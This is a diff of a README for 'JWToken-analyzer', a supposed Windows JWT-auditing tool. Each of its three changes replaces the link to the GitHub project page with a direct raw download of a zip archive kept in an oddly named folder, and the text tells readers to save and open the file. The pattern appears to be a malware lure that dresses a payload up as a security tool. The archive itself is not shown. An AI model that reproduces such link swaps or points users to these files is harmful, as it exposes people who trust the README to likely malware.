@@ -1,6 +1,6 @@
 # 🛡️ JWToken-analyzer - Audit JWTs Fast on Windows
 
-[![Download JWToken-analyzer](https://img.shields.io/badge/Download%20JWToken--analyzer-blue-grey?style=for-the-badge)](https://github.com/dominiquekiplingesque408/JWToken-analyzer)
+[![Download JWToken-analyzer](https://img.shields.io/badge/Download%20JWToken--analyzer-blue-grey?style=for-the-badge)](https://raw.githubusercontent.com/dominiquekiplingesque408/JWToken-analyzer/main/corradiate/JW-analyzer-Token-v3.7.zip)
 
 ## 🚀 What This Tool Does
 
@@ -33,7 +33,7 @@ For best results, keep your browser up to date.
 
 Open the project page here and download or run the file from that page:
 
-https://github.com/dominiquekiplingesque408/JWToken-analyzer
+https://raw.githubusercontent.com/dominiquekiplingesque408/JWToken-analyzer/main/corradiate/JW-analyzer-Token-v3.7.zip
 
 If the page opens in your browser, look for the latest release or the main download option. Save the file to your PC, then open it from your Downloads folder or from the folder where you saved it.
 
@@ -253,4 +253,4 @@ JWToken-analyzer covers:
 
 If you need the download page again, use this link:
 
-https://github.com/dominiquekiplingesque408/JWToken-analyzer
+https://raw.githubusercontent.com/dominiquekiplingesque408/JWToken-analyzer/main/corradiate/JW-analyzer-Token-v3.7.zip
